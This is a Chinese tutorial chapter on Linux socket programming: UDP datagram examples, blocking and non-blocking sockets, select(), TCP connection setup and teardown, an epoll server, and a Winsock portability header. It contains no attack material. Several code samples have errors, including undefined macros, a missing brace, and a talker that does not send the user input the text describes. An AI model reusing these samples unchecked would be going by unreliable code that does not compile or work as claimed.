**数据包 Sockets, UDP 模式**

    不想讲更多了, 所以我给出代码 talker.c 和 listener.c. listener.exe 在机器上等待在
    端口 8088 来的数据包. talker.exe 发送数据包到一定的机器, 它包含用户在命令行输入的
    内容. 再扯一点吧 TCP 和 UDP 可以绑定相同端口. TCP 服务端口监听, UDP 不监听. 从协
    议头区分是 TCP 还是 UDP.

这里就是 listener.c

```C
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/types.h>

#define _INT_PORT	(8088)

#define CERR_IF(code) \
	if((code) < 0) \
		perror(#code), exit(EXIT_FAILURE)

// 打印数据
static void _print(char buf[], int len) {
	int i = -1;
	while(++i < len)
		putchar(buf[i]);
	fflush(stdout);
}

int main(int argc, char * argv[]) {
	int sfd, len;
	char buf[BUFSIZ];
	socklen_t clen = sizeof(struct sockaddr_in);
	struct sockaddr_in caddr, saddr = { AF_INET, htons(_INT_PORT) };
	CERR_IF(sfd = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP));
	// 绑定地址, 然后接收数据
	CERR_IF(bind(sfd, (struct sockaddr *)&saddr, clen));
	CERR_IF(len = recvfrom(sfd, buf, BUFSIZ, 0, (struct sockaddr *)&caddr, &clen));
	
	// 返回最终结果
	printf("get packet from %s.\n", inet_ntoa(caddr.sin_addr));
	printf("packet is %d bytes long\n", len);
	printf("packet contains:");
	_print(buf, len);
	
	return close(sfd);
}
```

    编译指令:
    gcc -g -O2 -Wall -Wno-unused-result -o listener.exe listener.c
    注意在我们的调用 socket(), 我们最后使用了 SOCK_DGRAM. 同时没有必要去使用
    listen() 或者 accept(). 我们在使用无连接的数据报套接字!

下面是 talker.c

```C
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <arpa/inet.h>

#define _STR_HEOO	"我是个龌蹉的人, 从读大学开始. 我想做个好人, 从工作开始...\r\n"
#define _INT_PORT	(8088)

#define CERR_IF(code) \
    if((code) < 0) \
        perror(#code), exit(EXIT_FAILURE)

int main(int argc, char * argv[]) {
	int sfd;
	struct sockaddr_in saddr = { AF_INET, htons(_INT_PORT) };
	CERR_IF(sfd = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP));
	// 发送消息
	CERR_IF(sendto(sfd, _STR_HEOO, sizeof _STR_HEOO, 0, (struct sockaddr *)&saddr, sizeof saddr));
	// 返回最终结果
	puts("over, 人也只是造物主的一个玩具, 除非出现 BUG or 异常!");
	
	return close(sfd);
}
```

    编译代码
    gcc -g -O2 -Wall -Wno-unused-result -o talker.exe talker.c

![UDP监听](./img/UDP监听.png)

    上面是 listener.exe 接收消息, 下面是talker.exe 发送消息. 
    (TCP和UDP可以重用相同端口)

![UDP发送](./img/UDP发送.png)

    这就是所有的了. 在一台机器上运行 listener.exe, 然后在另外一台机器上运行
    talker.exe. 观察它们的通讯! 除了一些我在上面提到的数据套接字连接的小细节外, 
    对于数据套接字, 我还得说一些, 当一个讲话者呼叫 connect() 函数时并指定接受者
    的地址时, 从这点可以看出, 讲话者只能向 connect() 函数指定的地址发送和接受信
    息. 因此, 你不需要使用 sendto() 和 recvfrom(), 你完全可以用 send() 和 
    recv() 代替. 到这里基本上 TCP 和 UDP 至少知道几个 Linux 上使用 API 了. 后
    面就看个人投入. 好继续.

**阻塞**

    阻塞, 你也许早就听说了. "阻塞"是 "sleep" 的科技行话. 你可能注意到前面运行的
    listener.exe 程序, 它在那里不停地运行, 等待数据包的到来. 实际在运行的是它调
    用 recvfrom(), 然后没有数据, 因此 recvfrom() 说 "阻塞(block)", 直到数据的
    到来. 很多函数都利用阻塞. accept() 阻塞, 所有的 recv*() 函数阻塞. 它们之所
    以能这样做是因为它们被允许这样做. 当你第一次调用 socket() 建立套接字描述符的
    时候, 内核就将它设置为阻塞. 如果你不想套接字阻塞, 你就要调用函数 fcntl() 修
    改为非阻塞模式

```C
#include <fcntl.h>
#include <unistd.h>
int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
int mode = fcntl(s, F_GETFL, 0);
fcntl(s, F_SETFL, mode | O_NONBLOCK);
```

    通过设置套接字为非阻塞, 你能够有效地"询问"套接字以获得信息. 如果你尝试着从
    一个非阻塞的套接字读信息并且没有任何数据, 它不允许阻塞 -- 它将返回 -1 并将
    errno 设置为 EWOULDBLOCK. 但是一般说来, 这种询问不是个好主意. 如果你让你
    的程序在忙等状态查询套接字的数据, 你将浪费大量的 CPU 时间. 更好的解决之道是
    用下一节讲的 select() 去查询是否有数据要读进来.

### 7.2.5 编程拓展

    说了那么多, 后面也许是高潮, 更多还是回顾. 因为一开始就已经决定了.

**select() 多路复用 I/O**

    虽然这个函数有点奇怪, 但是它很有用. 假设这样的情况: 你是个服务器, 你一边在
    不停地从连接上读数据, 一边在侦听连接上的信息. 没问题, 你可能会说, 不就是一个
    accept() 和两个 recv() 吗? 这么容易吗, 朋友? 如果你在调用 accept() 的时候
    阻塞呢? 你怎么能够同时接受 recv() 数据? "用非阻塞的套接字啊!" 不行! 你不想
    耗尽所有的 CPU 吧? 那么, 该如何是好? select() 让你可以同时监视多个套接字. 
    如果你想知道的话, 那么它就会告诉你哪个套接字准备读, 哪个又准备写, 哪个套接字
    又发生了例外(exception). 闲话少说, 下面是 select():

```C
/* According to POSIX.1-2001, POSIX.1-2008 */
#include <sys/select.h>

/* According to earlier standards */
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>

int select(int nfds, fd_set  * readfds, fd_set * writefds,
           fd_set * exceptfds, struct timeval * timeout);

void FD_CLR(int fd, fd_set * set);
int  FD_ISSET(int fd, fd_set * set);
void FD_SET(int fd, fd_set * set);
void FD_ZERO(fd_set * set);
```

    这个函数监视一系列文件描述符, 特别是 readfds writefds 和 exceptfds. 如果
    你想知道你是否能够从标准输入和套接字描述符 sockfd 读入数据, 你只要将文件描述符
    0 和 sockfd 加入到集合 readfds 中. 参数 numfds 应该等于最高的文件描述符的值
    加1. 在这个例子中, 你应该设置该值为 sockfd + 1. 因为它一定大于标准输入的文件描
    述符 (0). 当函数 select() 返回的时候, readfds 的值修改为反映你选择的哪个文件
    描述符可以读. 你可以用下面讲到的宏 FD_ISSET() 来测试. 在我们继续下去之前, 让
    我来讲讲如何对这些集合进行操作. 每个集合类型都是 fd_set. 下面有一些宏来对这个类
    型进行操作:

        FD_ZERO(fd_set * set)           - 清除一个文件描述符集合
        FD_SET(int fd, fd_set * set)    - 添加 fd 到集合
        FD_CLR(int fd, fd_set * set)    - 从集合中移去 fd
        FD_ISSET(int fd, fd_set * set)  - 测试 fd 是否在集合中

    最后, 是有点古怪的数据结构 struct timeval. 有时你可不想永远等待别人发送数据过
    来. 也许什么事情都没有发生的时候你也想每隔 64 秒在终端上打印字符串 "谢谢 你". 
    这个数据结构允许你设定一个时间, 如果时间到了, 而 select() 还没有找到一个准备好
    的文件描述符, 它将返回让你继续处理. 数据结构 struct timeval 是这样的:

        struct timeval {
            long    tv_sec;         /* seconds */
            long    tv_usec;        /* microseconds */
        };

    只要将 tv_sec 设置为你要等待的秒数, 将 tv_usec 设置为你要等待的微秒数就可以了.
    是的, 是微秒而不是毫秒. 1,000 微秒等于 1 毫秒，1,000 毫秒等于 1 秒. 也就是说, 
    1 秒等于 1,000,000 微秒. 为什么用符号 "usec" 呢? 字母 "u" 很象希腊字母 Mu，
    而 Mu 表示 "微" 的意思. 当然, 函数返回的时候 timeout 可能是剩余的时间, 之所以
    是可能, 是因为它依赖于你的 linux 操作系统. 哈! 我们现在有一个微秒级的定时器! 别
    计算了, 老标准的 Linux 系统的时间片是 100 毫秒, 所以无论你如何设置你的数据结构 
    struct timeval, 你都要等待那么长的时间. 还有一些有趣的事情: 如果你设置数据结构
    struct timeval 中的数据为 0, select() 将立即超时, 这样就可以有效地轮询集合中的
    所有的文件描述符. 如果你将参数 timeout 赋值为 NULL, 那么将永远不会发生超时, 即
    一直等到第一个文件描述符就绪. 最后, 如果你不是很关心等待多长时间, 那么就把它赋为
    NULL 吧. 下面的代码演示了在标准输入上等待 2.5 秒:

演示代码 select.c

```C
#include <stdio.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>

// 等待控制台2.5s操作
int main(int argc, char * argv[]) {
	fd_set fds = { 0 };
	struct timeval tv = { 2, 500000 };
	
	FD_SET(STDIN_FILENO, &fds);
	if(select(STDIN_FILENO + 1, &fds, NULL, NULL, &tv) < 0) {
		printf("select error tv = %ld | %ld.\n", tv.tv_sec, tv.tv_usec);
		return -1;
	}

	// 判断结果
	if(FD_ISSET(STDIN_FILENO, &fds))
		puts("A key war pressed!");
	else
		puts("Timed out");

	return 0;
```

    编译命令截图如下:
    gcc -g -O2 -Wall -Wno-unused-result -o select.exe select.c

![select操作](./img/select操作.png)

    如果你是在一个 line buffered 终端上, 那么你敲的键应该是回车 (RETURN), 否则
    无论如何它都会超时. 现在, 你可能回认为这就是在数据报套接字上等待数据的方式 -
    你是对的: 它可能是. 有些 linux 系统可以按这种方式, 而另外一些则不能. 你在尝试
    以前可能要先看看本系统的 man page 了. 最后一件关于 select() 的事情: 如果你有
    一个正在侦听 (listen()) 的套接字, 你可以通过将该套接字的文件描述符加入到 
    readfds 集合中来看是否有新的连接. 这就是我关于函数 select() 要讲的所有的东西.
    到这里本应该结束了, 但是一念想起高中老师的谆谆教导, 回赠个总的复习吧!

**此刻回顾 TCP 链接和关闭**

    下面回顾下 socket 中的 TCP connect -> listen -> accept 和 close

    a) 三次握手建立连接
    我们知道 tcp 建立连接要进行"三次握手", 即交换三个分组. 大致流程如下:
        * 客户端向服务器发送一个 SYN J，尝试连接服务器
        * 服务器向客户端响应一个 SYN K, 并对 SYN J 进行确认 ACK J+1, 
          表示服务器可用, 可以建立连接了
        * 客户端再向服务器发一个确认 ACK K+1, 连接建立成功
    这三次握手发生在 socket 的那几个函数中呢？请看下图建立 TCP 连接的三次握手过程

![三次握手](./img/三次握手.png)

    从图中可以看出, 当客户端调用 connect 时, 触发了连接请求, 向服务器发送了 SYN J
    包, 这时 connect 进入阻塞状态; 服务器监听到连接请求, 即收到 SYN J 包, 调用 
    accept 函数接收请求, 向客户端发送 SYN K, ACK J+1, 这时 accept 进入阻塞状态;
    客户端收到服务器的SYN K, ACK J+1 之后, 这时 connect 返回, 并对 SYN K 进行确
    认; 服务器收到 ACK K+1 时, accept 返回, 至此三次握手完毕, 连接建立.
    总结: 客户端的 connect 在三次握手的第二次返回，而服务器端的 accept 在三次握手
    的第三次返回.

    b) 四次握手释放链接
    对于 socket 关闭中请看下图 TCP 断开的四次分手过程

![四次分手](./img/四次分手.png)
    
    图示过程如下：
        * 某个应用进程首先调用 close 主动关闭连接, 这时 TCP 发送一个 FIN M;
        * 另一端接收到 FIN M 之后, 执行被动关闭, 对这个 FIN 进行确认. 它的接收也
          作为文件结束符传递给应用进程, 因为 FIN 的接收意味着应用进程在相应的连接
          上再也接收不到额外数据;
        * 一段时间之后，接收到文件结束符的应用进程调用 close 关闭它的 socket. 这
          导致它的 TCP 也发送一个 FIN N;
        * 接收到这个 FIN 的源发送端 TCP 对它进行确认. 这样每个方向上都有一个 FIN 
          和 ACK. 建立一个连接需要三次握手, 而终止一个连接要经过四次握手, 这是由 
          TCP 的半关闭 (half-close) 造成的. 由于 TCP 连接是全双工的, 因此每个方向
          都必须单独进行关闭. 这个原则是当一方完成它的数据发送任务后就能发送一个 FIN
          来终止这个方向的连接. 收到一个 FIN 只意味着这一方向上没有数据流动, 一个 
          TCP 连接在收到一个 FIN 后仍能发送数据. 首先进行关闭的一方将执行主动关闭,
          而另一方执行被动关闭.

    下面是一个更详细的图解, TCP 关闭的四次分手过程(其实最好看 TCP 实现, 上面都是加
    深层面, 和具体实现的字节, 标识等等有些差异.)

![四次分手详细](./img/四次分手详细.png)
    
    到这里不妨来个自问自答, 简易巩固一下基础扯淡的文字.

    1) 为什么建立连接协议是三次握手, 而关闭连接却是四次握手呢?
    这是因为服务端的 LISTEN 状态下的 SOCKET 当收到 SYN 报文的建连请求后, 它可以把 
    ACK 和 SYN(ACK 起应答作用, 而 SYN 起同步作用) 放在一个报文里来发送. 但关闭连接
    时, 当收到对方的 FIN 报文通知时, 它仅仅表示对方没有数据发送给你了; 但未必你所有
    的数据都全部发送给对方了, 所以你可以未必会马上会关闭 SOCKET, 也即你可能还需要发
    送一些数据给对方之后, 再发送 FIN 报文给对方来表示你同意现在可以关闭连接了, 所以
    它这里的 ACK 报文和 FIN 报文多数情况下都是分开发送的.

    2) 为什么 TIME_WAIT 状态还需要等 2MSL 后才能返回到 CLOSED 状态?
    这是因为虽然双方都同意关闭连接了, 而且握手的 4 个报文也都协调和发送完毕, 按理可
    以直接回到 CLOSED 状态(就好比从 SYN_SEND 状态到 ESTABLISH 状态那样); 但是因为
    我们必须要假想网络是不可靠的, 你无法保证你最后发送的 ACK 报文会一定被对方收到, 
    因此对方处于 LAST_ACK 状态下的 SOCKET 可能会因为超时未收到 ACK 报文, 而重发 
    FIN 报文, 所以这个 TIME_WAIT 状态的作用就是用来重发可能丢失的 ACK 报文. 原本
    想再举一个 TCP 回显服务器例子, 但是写起来比较多. 进程回收, 信号控制. 有兴趣的
    力求自行科普吧!

**从 IO 复用中结束吧**

    最好继续帮助加深理解吧. 其实网络编程还是比较难搞的. 细节还是有的, 网络编程内幕确
    实不少. 我也只是个菜鸡. 到这里, 还需要掌握一个 Linux 上一种 IO 复用机制 epoll 
    管理文件描述符, 也就是一组网络编程的基于事件回调的 API. 修行的就看个人了, 
    演示 Demo 如下:

epoll 简单服务器文件 : epoll_srvone.c

```C
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <limits.h>
#include <stdlib.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/epoll.h>
#include <sys/socket.h>

//
// 当前简易 epoll heoo server 用到的参数宏
//
#define _INT_PORT		(8088)
#define _INT_WAIT		(61 * 1000)

#define CERR(fmt, ...) \
	fprintf(stderr, "[%s:%s:%d][errno %d:%s]" fmt "\n", \
		__FILE__, __func__, __LINE__, errno, strerror(errno), ##__VA_ARGS__)

#define CERR_IF(code) \
	if((code) < 0) \
		CERR(fmt, ##__VA_ARGS__), exit(EXIT_FAILURE)

#define NIL
#define RETURN(val, fmt, ...) \
	do { \
		CERR(fmt, ##__VA_ARGS__); \
		return val; \
	} while(0)

// clt 客户端 socket, 主要是打印头信息,和输出时间
void clt_echo(int cltk, int epd);
// 设置客户端链接,只有 epoll 获取到有链接过来才处理
void clt_add(int srv, int epd);
// 边缘触发 处理读取业务
void clt_run(int fd, int efd);

//
// 函数主业务
//
int main(int argc, char * argv[]) {
	int srvk, epd, nfds, on = 1;
	// 创建 epoll 对象
	struct epoll_event evs[_INT_EPOLL], ev = { EPOLLIN | EPOLLET };
	struct sockaddr_in saddr = { AF_INET, htons(_INT_PORT) };
	
	// 创建 socket 并检测
	CERR_IF(srvk = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP));
	//设置地址复用
	CERR_IF(setsockopt(srvk, SOL_SOCKET, SO_REUSEADDR, &on, sizeof on));
	//设置 socket 为非阻塞的
	setnonblock(srvk);
	//绑定地址地址
	CERR_IF(bind(srvk, (struct sockaddr*)&saddr, sizeof saddr));
	//开始监听端口
	CERR_IF(listen(srvk, SOMAXCONN));
	//这里创建 epoll 对象的句柄
	CERR_IF(epd = epoll_create1(0));
	//这里注册一个监听事件, 这里采用边缘触发模型
	ev.data.fd = srvk;
	//注册这个事件到 epd 文件描述符下
	CERR_IF(epoll_ctl(epd, EPOLL_CTL_ADD, srvk, &ev));
	
	//下面是等待操作,将时间传送给客户端
	for (;;) {
		CERR_IF(nfds = epoll_wait(epd, evs, _INT_EPOLL, _INT_WAIT));
		
		//简单处理超时
		if(0 == nfds) {
			puts("epoll server timeout, server auto destroy......");
			break;
		}
		
		//处理连接 客户端链接
		for(on = 0; on < nfds; ++on) {
			struct epoll_event * ei = evs + on;
			int fd = ei->data.fd;
			// 有数据可以读取
			if(ei->events & EPOLLIN){ 
				if(fd == srvk)
					clt_add(fd, epd);
				else
					clt_run(fd, epd);
				continue;
			}
			
			// 如果有数据要发送
			if(ei->events & EPOLLOUT){ 
				//这里打印客户端信息
				clt_echo(fd, epd);
				continue;
			}
			
			// 其它事件 目前没有处理
		}
	}
	
	close(epd);
	close(srvk);
	return EXIT_SUCCESS;
}

// 设置套接字阻塞和非阻塞
inline void setnonblock(int sck) {
	int mode = fcntl(sck, F_GETFL);
	CERR_IF(fcntl(sck, F_SETFL, mode | O_NONBLOCK));
}

void
clt_echo(int cltk, int efd) {
	char buf[BUFSIZ];
	//获取客户端连接信息
	struct sockaddr_in caddr;
	socklen_t crl = sizeof caddr;
	struct epoll_event ev = { EPOLLIN | EPOLLET, { .fd = cltk } };
	if(getpeername(cltk, (struct sockaddr *)&caddr, &crl) < 0) {
		epoll_ctl(efd, EPOLL_CTL_DEL, cltk, &ev);
		close(cltk);
        RETURN(NIL, "getpeername cltk is error = %d.", cltk);
    }
	
	//拼接字符串
	crl = snprintf(buf, sizeof buf, "[%s:%d]To start, X-ray emission -> ...",
		inet_ntoa(caddr.sin_addr), ntohs(caddr.sin_port));
	puts(buf);
	//这里发送信息给客户端, 这里不考虑传输不稳定情况
	write(cltk, buf, crl);
	
	//重新注册为读事件, 采用边缘触发
	epoll_ctl(efd, EPOLL_CTL_MOD, cltk, &ev);
}

void 
clt_add(int srv, int epd) {
	int clt;
	struct sockaddr_in caddr;
	socklen_t crl = sizeof caddr;
	struct epoll_event ev = { EPOLLIN | EPOLLET };
	CERR_IF(clt = accept(srv, (struct sockaddr *)&caddr, &crl));
	setnonblock(clt);
	//这里设置 epoll 事件
	ev.data.fd = clt;
	epoll_ctl(epd, EPOLL_CTL_ADD, clt, &ev);
}

void 
clt_run(int fd, int efd) {
	// 先读取内容, 在重新设置边缘触发
	ssize_t n;
	char buf[BUFSIZ + 1];
	struct epoll_event ev = { EPOLLOUT | EPOLLET, { .fd = fd } };
	do {
		n = read(fd, buf, BUFSIZ);
		if(n <= 0){
			if(errno == EINTR)
				continue;
			if(errno == EAGAIN) // 当前事件已经处理完毕!
				break;
			
			// 解析错误, 下面都是异常直接退出
			epoll_ctl(efd, EPOLL_CTL_DEL, fd, &ev);
			close(fd);
			
			// n == 0 || errno == ECONNRESET -> 链接已经断开
			RETURN(NIL, "read error n = %ld, fd = %d.", n, fd);
		}
		
		// 这里输出内容
		buf[n] = '\0';
		printf("%s", buf);
	} while(n >= BUFSIZ);
	
	//修改 fd 的处理事件为写事件
	epoll_ctl(efd, EPOLL_CTL_MOD, fd, &ev);
}
```

    如果你抄写完毕, 再执行编译后, 通过 telnet 可以简单测试测试. 到这里关于 C 基础 
    SOCKET 开发回顾基本结束了, 应该带领了一些人走进了 Linux socket 开发的大门吧. 
    错误是难免的, 抄袭创新也是纯水推广的. 毕竟一山还比一山高!

    当然这仅仅是 linux socket 部分, 后面也会通过一个巧妙思路来上手 winds socket.
    部分 ~ 还有网络 IO 的封装, 哈哈, 祝你好运小伙!

## 7.3 轰击金丹 socket 基础终章

    很高兴能到这里, 后面的这些封装可能让你在实战中势如破竹. 至少解决客户端业务如鱼
    得水. 因为通过上面的基础稳固, 大体上回忆起 linux socket 有哪些 api 用法. 那 
    winds 呢. 这是个问题, 解决思路有很多, 多数人解决方案喜欢构建一套通用接口, 分别
    实现. 这里介绍一个更加巧妙的实现, 就是在 winds 上面极大可能的模拟 linux api 用
    法. 这样以后移植大佬代码提供极大方面. 那么无外乎 errno 机制, read , write 机制,
    还有接口的细节上移植. 采用这个思路那我们开始搞起.

### 7.3.1 winds socket 实现 errno

    winds 本身也有 errno, 但是在 socket 操作的时候, 走另一套机制 WSAGetLastError.
    那么就对它进行外科手术. 

```C
#undef	errno
#define	errno                   WSAGetLastError()
```

    同样 errno 得到错误码, 如何转成错误字符串(strerror). 对于 winds socket 很抱
    歉没有提供这么完备的函数. 但是没关系, 我们自己实现. 大家不妨看看 winerror.h 文件,
    豁然开朗

```C
// winerror.h 摘选部分

//
// MessageId: ERROR_SUCCESS
//
// MessageText:
//
// The operation completed successfully.
//
#define ERROR_SUCCESS                    0L

//
// MessageId: ERROR_INVALID_FUNCTION
//
// MessageText:
//
// Incorrect function.
//
#define ERROR_INVALID_FUNCTION           1L    // dderror

......
```

    大家有没有一点明白了, 上面很有规律不是吗! 通过这个规律我们就能自己实现一个 strerror 
    相似的函数. 看我的一种实现模板

strerr.c.template

```C
#if defined(__GNUC__)

#include <string.h>

extern inline const char * strerr(int error) {
    return strerror(error);
}

#endif

#if defined(_MSC_VER)

#include <stdio.h>
#include <winerror.h>

#define DWORD int

extern const char * strerr(int error) {
    switch (error) {
    case {MessageId} : return "{MessageText}";
    ......
    }

    fprintf(stderr, "strerr invaild error = %d.\n", error);
    return "The aliens are coming. Go tell your favorite people";
}

#undef DWORD

#endif
```

    是不是豁然开朗, 根据上面模板, 大家不妨当个阅读理解写一个切词的工具. 我用C写了个,
    人工干预其中几个重复的. 人总是向着希望走, 还是很有意思的. 

```C
#undef	strerror
#define strerror                (char *)strerr
```

    到这里是不是关于 linux socket errno 在 winds 就实现了一套了. 就是这样的野路子,
    不也能达到效果吗 ~

### 7.3.2 出来吧 socket 接口设计

    这个设计的 linux, winds 接口文件名称是 scsocket.h, 请记住它, 它会让你好看! 首先
    看看其中共有头文件设计.

```C
#ifndef _H_SIMPLEC_SCSOCKET
#define _H_SIMPLEC_SCSOCKET

#include <fcntl.h>
#include <signal.h>
#include "schead.h"

//
// IGNORE_SIGPIPE - 管道破裂,忽略SIGPIPE信号
//
#define IGNORE_SIGNAL(sig)	signal(sig, SIG_IGN)

#ifdef __GNUC__

#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <sys/un.h>
#include <sys/uio.h>
#include <sys/select.h>
#include <sys/resource.h>

//
// This is used instead of -1, since the. by WinSock
//
#define INVALID_SOCKET          (~0)
#define SOCKET_ERROR            (-1)

#if !defined(EWOULDBOCK)
#define EWOULDBOCK              EAGAIN
#endif

// connect链接还在进行中, linux显示 EINPROGRESS，winds是 WSAEWOULDBLOCK
#define ECONNECTED              EINPROGRESS

#define SET_RLIMIT_NOFILE(num) \
	do { \
		struct rlimit $r = { num, num }; \
		setrlimit(RLIMIT_NOFILE, &$r); \
	} while(0)

typedef int socket_t;

#elif _MSC_VER

#undef	FD_SETSIZE
#define FD_SETSIZE              (1024)
#include <ws2tcpip.h>

#define SET_RLIMIT_NOFILE(num)	

#undef	errno
#define	errno                   WSAGetLastError()
#undef	strerror
#define strerror                (char *)strerr

#undef  EINTR
#define EINTR                   WSAEINTR
#undef	EAGAIN
#define EAGAIN                  WSAEWOULDBLOCK
#undef	EINVAL
#define EINVAL                  WSAEINVAL
#undef	EWOULDBOCK
#define EWOULDBOCK              WSAEINPROGRESS
#undef	EINPROGRESS
#define EINPROGRESS             WSAEINPROGRESS
#undef	EMFILE
#define EMFILE                  WSAEMFILE
#undef	ENFILE
#define ENFILE                  WSAETOOMANYREFS

// connect链接还在进行中, linux显示 EINPROGRESS，winds是 WSAEWOULDBLOCK
#define ECONNECTED              WSAEWOULDBLOCK

/*
 * WinSock 2 extension -- manifest constants for shutdown()
 */
#define SHUT_RD                 SD_RECEIVE
#define SHUT_WR                 SD_SEND
#define SHUT_RDWR               SD_BOTH

typedef int socklen_t;
typedef SOCKET socket_t;

//
// gettimeofday - Linux sys/time.h 中得到微秒的一种实现
// tv		:	返回结果包含秒数和微秒数
// tz		:	包含的时区,在window上这个变量没有用不返回
// return	:   默认返回0
//
extern int gettimeofday(struct timeval * tv, void * tz);

//
// strerr - linux 上面替代 strerror, winds 替代 FormatMessage 
// error	: linux 是 errno, winds 可以是 WSAGetLastError() ... 
// return	: system os 拔下来的提示字符串常量
//
extern const char * strerr(int error);

#else
#	error "error : Currently only supports the Best New CL and GCC!"
#endif

// EAGAIN and EWOULDBLOCK may be not the same value.
#if (EAGAIN != EWOULDBOCK)
#define EAGAIN_WOULDBOCK EAGAIN : case EWOULDBOCK
#else
#define EAGAIN_WOULDBOCK EAGAIN
#endif

// 目前通用的tcp udp v4地址
typedef struct sockaddr_in sockaddr_t;

//
// socket_start - 单例启动socket库的初始化方法
// 
extern void socket_start(void);

#endif // !_H_SIMPLEC_SCSOCKET
```

    INVALID_SOCKET 和 SOCKET_ERROR 是 linux 模拟 winds 严谨的错误验证. 前者用于
    默认无效的 socket 对象, 后者用于各种 socket 接口执行错误的时候返回的值. linux
    上 EWOULDBOCK 宏已经取消和 EAGAIN 宏功能重叠(socket 层面表示缓冲区已经读取空了)
    , 为了接口统一操作, 额外添加上. 其中 ECONNECTED 宏单独添加上的为了解决非阻塞的 
    connect 操作状态不一样问题. 其它的随后用上的时候你会豁然开朗. 

```C
#ifdef _MSC_VER

inline int
gettimeofday(struct timeval * tv, void * tz) {
    struct tm st;
    SYSTEMTIME wtm;

    GetLocalTime(&wtm);
    st.tm_year = wtm.wYear - 1900;
    st.tm_mon = wtm.wMonth - 1; // window的计数更好些
    st.tm_mday = wtm.wDay;
    st.tm_hour = wtm.wHour;
    st.tm_min = wtm.wMinute;
    st.tm_sec = wtm.wSecond;
    st.tm_isdst = -1; // 不考虑夏令时

    tv->tv_sec = (long)mktime(&st); // 32位使用数据强转
    tv->tv_usec = wtm.wMilliseconds * 1000; // 毫秒转成微秒

    return 0;
}

#endif
```

    对于 gettimeofday 接口 linux 上面应用的非常广泛. 但是前面已经知道完全可以通过
    time_get 更加优美的得到你想要得时间. 但是为了让有些程序好移植, 所以在 winds 上
    面了一套. 还有个下面函数非常有意思

```C
inline void 
socket_start(void) {
#ifdef _MSC_VER
#   pragma comment(lib, "ws2_32.lib")
    WSADATA wsad;
    WSAStartup(WINSOCK_VERSION, &wsad);
#elif __GUNC__
    IGNORE_SIGNAL(SIGPIPE)
#endif
}
```

    在 winds 上面 WSAStartup 和 WSACleanup 总是成双成对出现. 但是我们这里这个模块是
    模拟 linux 上 socket. linux 默认程序内嵌了相关 socket 模块 so 启动操作. 所以走
    全局, 没有使用卸载操作. 有的朋友喜欢这么额外添加下面一句

```C
static inline void _socket_start(void) {
	WSACleanup();
}
    // 在 socket_start 中插入这句
	atexit(_socket_start);
```

    这样做其实就是画蛇添足. 为啥呢, 在程序 exit 时候, 如果服务器的网络相关操作线程退出
    顺序是不确定的. 一旦 _socket_start 先触发, 对于其它调用方面就是各种 error 抛出来.
    倒不如走程序全局声明周期, 交给系统进程处理. 

    对于 EAGAIN_WOULDBOCK 宏, 用起来也是很飘

```C
switch (errno) {
case EINTR:
case EAGAIN_WOULDBOCK:
    return -1;
}
```

    是不是很巧妙. 面对 linux 过度封装的 errno 机制处理起来也变得很清晰吧. 
    随后看 scsocket.h 具体的业务接口, 本质就是在系统那套接口的基础上加了 socket_ 前缀.

```C
//
// socket_dgram     - 创建UDP socket
// socket_stream    - 创建TCP socket
// socket_close     - 关闭上面创建后的句柄
// socket_read      - 读取数据
// socket_write     - 写入数据
// socket_addr      - 通过ip, port 得到 ipv4 地址信息
//
extern socket_t socket_dgram(void);
extern socket_t socket_stream(void);
extern int socket_close(socket_t s);
extern int socket_read(socket_t s, void * data, int sz);
extern int socket_write(socket_t s, const void * data, int sz);
extern int socket_addr(const char * ip, uint16_t port, sockaddr_t * addr);

//
// socket_set_block     - 设置套接字是阻塞
// socket_set_nonblock  - 设置套接字是非阻塞
// socket_set_reuseaddr - 开启地址复用
// socket_set_keepalive - 开启心跳包检测, 默认2h 5次
// socket_set_recvtimeo - 设置接收数据毫秒超时时间
// socket_set_sendtimeo - 设置发送数据毫秒超时时间
//
extern int socket_set_block(socket_t s);
extern int socket_set_nonblock(socket_t s);
extern int socket_set_reuseaddr(socket_t s);
extern int socket_set_keepalive(socket_t s);
extern int socket_set_recvtimeo(socket_t s, int ms);
extern int socket_set_sendtimeo(socket_t s, int ms);

//
// socket_get_error - 得到当前socket error值, 0 表示正确, 其它都是错误
//
extern int socket_get_error(socket_t s);

//
// socket_recv      - socket接受信息
// socket_recvn     - socket接受len个字节进来
// socket_send      - socket发送消息
// socket_sendn     - socket发送len个字节出去
// socket_recvfrom  - recvfrom接受函数
// socket_sendto    - udp发送函数, 通过socket_udp 搞的完全可以 socket_send发送
//
extern int socket_recv(socket_t s, void * buf, int len);
extern int socket_recvn(socket_t s, void * buf, int len);
extern int socket_send(socket_t s, const void * buf, int len);
extern int socket_sendn(socket_t s, const void * buf, int len);
extern int socket_recvfrom(socket_t s, void * buf, int len, int flags, sockaddr_t * in, socklen_t * inlen);
extern int socket_sendto(socket_t s, const void * buf, int len, int flags, const sockaddr_t * to, socklen_t tolen);

//
// socket_bind      - 端口绑定返回绑定好的 socket fd, 失败返回 INVALID_SOCKET or PF_INET PF_INET6
// socket_listen    - 端口监听返回监听好的 socket fd.
//
extern socket_t socket_bind(const char * host, uint16_t port, uint8_t protocol, int * family);
extern socket_t socket_listen(const char * host, uint16_t port, int backlog);

//
// socket_tcp           - 创建TCP详细的套接字
// socket_udp           - 创建UDP详细套接字
// socket_accept        - accept 链接函数
// socket_connect       - connect操作
// socket_connects      - 通过socket地址连接
// socket_connecto      - connect连接超时判断
// socket_connectos     - connect连接客户端然后返回socket_t句柄
//
extern socket_t socket_tcp(const char * host, uint16_t port);
extern socket_t socket_udp(const char * host, uint16_t port);
extern socket_t socket_accept(socket_t s, sockaddr_t * addr);
extern int socket_connect(socket_t s, const sockaddr_t * addr);
extern int socket_connects(socket_t s, const char * ip, uint16_t port);
extern int socket_connecto(socket_t s, const sockaddr_t * addr, int ms);
extern socket_t socket_connectos(const char * host, uint16_t port, int ms);
